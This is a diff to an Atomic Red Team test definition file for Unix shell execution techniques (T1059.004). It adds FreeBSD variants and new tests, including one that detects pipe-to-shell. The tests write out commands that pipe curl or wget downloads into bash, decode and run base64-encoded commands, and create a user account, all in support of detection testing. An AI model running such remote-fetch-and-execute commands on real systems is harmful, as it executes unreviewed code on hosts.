@@ -4,10 +4,10 @@ atomic_tests:
 - name: Create and Execute Bash Shell Script
   auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
   description: |
-    Creates and executes a simple bash script.
+    Creates and executes a simple sh script.
   supported_platforms:
-  - macos
   - linux
+  - macos
   input_arguments:
     script_path:
       description: Script path
@@ -29,8 +29,8 @@ atomic_tests:
 
     Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
   supported_platforms:
-  - macos
   - linux
+  - macos
   executor:
     command: |
       curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
@@ -158,16 +158,17 @@ atomic_tests:
     name: sh
     elevation_required: false
     command: |
-      ART=$(echo -n "id" |base64 -w 0)
+      [ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"
+      ART=$(echo -n "id" | $encodecmd)
       echo "\$ART=$ART"
-      echo -n "$ART" |base64 -d |/bin/bash
-      unset ART 
+      echo -n "$ART" | $decodecmd |/bin/bash
+      unset ART
 - name: Change login shell
   auto_generated_guid: c7ac59cb-13cc-4622-81dc-6d2fee9bfac7
   description: |
     An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. 
   supported_platforms:
-    - linux
+  - linux
   dependencies:
   - description: |
       chsh - change login shell, must be installed
@@ -178,24 +179,63 @@ atomic_tests:
   executor:
     name: bash
     elevation_required: true 
-    command: |      
-      useradd -s /bin/bash art
+    command: |
+      [ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
       cat /etc/passwd |grep ^art
       chsh -s /bin/sh art
       cat /etc/passwd |grep ^art
     cleanup_command: | 
-      userdel art
+      [ "$(uname)" = 'FreeBSD' ] && rmuser -y art || userdel art
 - name: Environment variable scripts
   auto_generated_guid: bdaebd56-368b-4970-a523-f905ff4a8a51
   description: |
     An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash
   supported_platforms:
-    - linux
+  - linux
   executor:
-    name: bash
+    name: sh
     elevation_required: false 
     command: |
       export ART='echo "Atomic Red Team was here... T1059.004"'
-      echo $ART |/bin/bash
+      echo $ART |/bin/sh
     cleanup_command: | 
       unset ART
+- name: Detecting pipe-to-shell
+  auto_generated_guid: fca246a8-a585-4f28-a2df-6495973976a1
+  description: |
+    An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if curl is installed on the machine.
+    prereq_command: |
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      cd /tmp
+      curl -s #{remote_url} |bash
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt
+- name: Current kernel information enumeration
+  auto_generated_guid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
+  description: |
+    An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
+  supported_platforms:
+  - linux
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      uname -srm
